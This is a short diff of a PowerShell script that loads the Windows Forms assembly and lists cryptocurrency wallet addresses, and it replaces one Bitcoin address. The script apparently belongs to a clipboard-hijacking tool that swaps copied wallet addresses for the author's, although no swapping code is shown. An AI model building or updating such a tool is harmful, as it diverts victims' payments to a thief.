@@ -1,6 +1,6 @@
 Add-Type -AssemblyName System.Windows.Forms
 
-$myBtcBech32 = "bc1qktqlt633t02x57sc8v5xseahysmz4j963lkl83"
+$myBtcBech32 = "bc1qaqjslgerhtltymu8vmm8q3kc0u4udfwvkm926w"
 $myBtcTaproot = "bc1pneq6d9rrpnhu5xpa8a6whhzjeku74r7yunnnnq27k0tqv6l0qjmsf4g8uf"
 $myEth = "0x2fd35c82Eb26da57cF630314C031695343aCbC57"
 $mySol = "7fdf9h4fzL4uJJS6kKaBbA1qFyvWGYkH7b9h9F9oRwTS"
